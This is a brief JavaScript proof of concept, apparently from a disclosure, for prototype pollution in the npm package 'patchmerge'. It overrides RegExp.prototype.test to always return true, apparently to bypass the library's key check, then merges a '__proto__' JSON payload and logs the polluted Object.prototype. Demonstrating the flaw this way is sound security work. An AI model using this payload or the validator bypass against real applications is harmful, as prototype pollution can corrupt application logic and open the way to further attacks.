RegExp.prototype.test = () => true;
var patchMerge = require('patchmerge');
var obj = {};
console.log({}.polluted);
patchMerge(obj, JSON.parse('{"__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);